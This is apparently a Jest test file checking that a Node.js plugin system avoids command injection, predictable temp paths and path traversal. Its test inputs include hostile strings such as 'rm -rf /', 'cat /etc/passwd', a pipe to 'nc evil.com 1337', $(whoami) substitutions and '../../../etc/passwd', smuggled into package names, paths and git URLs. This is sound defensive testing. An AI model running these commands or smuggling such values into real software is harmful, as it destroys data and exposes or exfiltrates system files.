/**
 * Plugin Security Tests
 * 
 * Tests for security improvements in the plugin system:
 * - Command injection prevention via execFileSync
 * - Secure temp directory generation
 * - Path validation
 */

const path = require('path');
const crypto = require('crypto');
const fs = require('fs-extra');
const { execFileSync } = require('child_process');

// Mock dependencies
jest.mock('axios');
jest.mock('ora', () => {
  return jest.fn(() => ({
    start: jest.fn().mockReturnThis(),
    succeed: jest.fn().mockReturnThis(),
    fail: jest.fn().mockReturnThis(),
    text: ''
  }));
});

jest.mock('../lib/security', () => ({
  secureWipeDirectory: jest.fn().mockResolvedValue(),
  sanitizeForLog: jest.fn((s) => s)
}));

jest.mock('../lib/audit', () => ({
  logSecurityViolation: jest.fn().mockResolvedValue()
}));

describe('Plugin Security Hardening', () => {
  describe('Temp Directory Generation', () => {
    it('should use cryptographically secure random names for temp directories', () => {
      // Generate multiple temp dir names and verify they're unique and unpredictable
      const names = new Set();
      for (let i = 0; i < 100; i++) {
        const randomBytes = crypto.randomBytes(16).toString('hex');
        const tempDir = path.join('/plugins', `.tmp-${randomBytes}`);
        
        // Verify format
        expect(tempDir).toMatch(/\.tmp-[a-f0-9]{32}$/);
        
        // Verify uniqueness
        expect(names.has(tempDir)).toBe(false);
        names.add(tempDir);
      }
      
      // All 100 should be unique
      expect(names.size).toBe(100);
    });

    it('should not use predictable timestamps for temp directories', () => {
      // Simulate old behavior (what we're fixing)
      const oldTempDir = path.join('/plugins', `.tmp-${Date.now()}`);
      
      // New behavior should NOT match timestamp pattern
      const randomBytes = crypto.randomBytes(16).toString('hex');
      const newTempDir = path.join('/plugins', `.tmp-${randomBytes}`);
      
      // Old pattern would be numeric, new is hex
      const oldBase = path.basename(oldTempDir).replace('.tmp-', '');
      const newBase = path.basename(newTempDir).replace('.tmp-', '');
      
      // Old was just a number (timestamp)
      expect(/^\d+$/.test(oldBase)).toBe(true);
      
      // New is hex string (32 chars of a-f0-9)
      expect(/^[a-f0-9]{32}$/.test(newBase)).toBe(true);
    });
  });

  describe('Command Injection Prevention', () => {    it('should use execFileSync with array arguments for tar extraction', () => {
      // Verify the fix: tar extraction should use execFileSync with array args
      // This prevents shell interpretation of special characters in paths
      
      const testCases = [
        {
          tarballPath: '/plugins/.tmp-abc123/package.tgz',
          tempDir: '/plugins/.tmp-abc123',
          description: 'normal paths'
        },
        {
          tarballPath: '/plugins/.tmp-abc123/package; rm -rf /.tgz',
          tempDir: '/plugins/.tmp-abc123',
          description: 'path with command injection attempt'
        },
        {
          tarballPath: '/plugins/.tmp-abc123/package.tgz',
          tempDir: '/plugins/.tmp-abc123; echo pwned',
          description: 'temp dir with command injection'
        }
      ];
      
      for (const tc of testCases) {
        // With execFileSync and array args, these should be treated as literal paths
        // not shell commands
        expect(() => {
          // Mock the call - in real code this would be:
          // execFileSync('tar', ['-xzf', tc.tarballPath, '-C', tc.tempDir])
          execFileSync('echo', ['test', tc.tarballPath, tc.tempDir]);
        }).not.toThrow();
      }
    });

    it('should use execFileSync with array arguments for npm install', () => {
      // Dependency names that could be malicious
      const maliciousDeps = [
        'lodash; rm -rf /',
        'lodash && cat /etc/passwd',
        'lodash | nc evil.com 1337',
        'lodash`whoami`',
        '$(whoami)',
        '`whoami`'
      ];
      
      // With execFileSync array args, these are treated as literal strings
      for (const dep of maliciousDeps) {
        expect(() => {
          // Mock call - real would be: execFileSync('npm', ['install', dep, '--prefix', pluginPath])
          execFileSync('echo', ['install', dep, '--prefix', '/test']);
        }).not.toThrow();
      }
    });

    it('should use execFileSync with array arguments for git clone', () => {
      // Malicious git URLs that could inject commands
      const maliciousUrls = [
        'https://github.com/user/repo; rm -rf /',
        'https://github.com/user/repo && cat /etc/passwd',
        'https://github.com/user/repo | nc evil.com 1337',
        '`whoami`.git'
      ];
      
      for (const url of maliciousUrls) {
        expect(() => {
          // Mock call - real would be: execFileSync('git', ['clone', '--depth', '1', url, pluginPath])
          execFileSync('echo', ['clone', '--depth', '1', url, '/test/path']);
        }).not.toThrow();
      }
    });
  });

  describe('Path Validation', () => {
    it('should detect path traversal attempts in plugin names', () => {
      // These paths demonstrate path traversal risks
      const traversalAttempts = [
        { name: '../../../etc/passwd', risk: 'escapes to /etc/passwd' },
        { name: 'plugin/../../../etc', risk: 'traverses up then to /etc' },
      ];
      
      for (const attempt of traversalAttempts) {
        const pluginPath = path.join('/plugins', attempt.name);
        const normalized = path.normalize(pluginPath);
        
        // Normalized path should not start with /plugins (it escaped!)
        // OR it contains '..' which indicates traversal attempt
        const escaped = !normalized.startsWith('/plugins') || normalized.includes('..');
        expect(escaped).toBe(true);
      }
    });
  });
});

describe('Plugin Security Integration', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('should verify all external command executions use safe patterns', () => {
    // This is a static analysis check to ensure the code uses safe patterns
    const pluginSource = require('fs').readFileSync(
      path.join(__dirname, '../lib/plugin.js'),
      'utf8'
    );
    
    // Should use execFileSync for external commands
    expect(pluginSource).toContain('execFileSync');
    
    // Should NOT use execSync with template literals containing variables
    // (This is the vulnerability we fixed)
    const dangerousPatterns = [
      /execSync\s*\(\s*`[^`]*\$\{[^}]*\}[^`]*`/g,  // execSync(`...${var}...`)
    ];
    
    for (const pattern of dangerousPatterns) {
      const matches = pluginSource.match(pattern) || [];
      // Allow the import statement which has execSync in a template literal
      const nonImportMatches = matches.filter(m => !m.includes('require('));
      expect(nonImportMatches).toHaveLength(0);
    }
  });
});
